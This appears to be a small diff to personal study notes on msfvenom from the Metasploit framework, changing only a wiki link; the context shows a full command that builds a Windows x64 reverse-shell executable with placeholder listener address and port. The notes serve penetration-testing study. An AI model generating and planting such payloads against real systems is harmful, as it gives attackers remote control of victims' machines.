@@ -2,7 +2,7 @@ Part of the Metasploit framework, msfvenom is used to generate code for primaril
 The standard syntax for msfvenom is as follows:
 `msfvenom -p <PAYLOAD> <OPTIONS>`  
 
-For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
+For example, to generate a Windows x64 Reverse [[Shell]] in an exe format, we could use:
 `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
 - **-f** is used to specifies the output format.
 - **-o** the output location and filename for the generated payload.
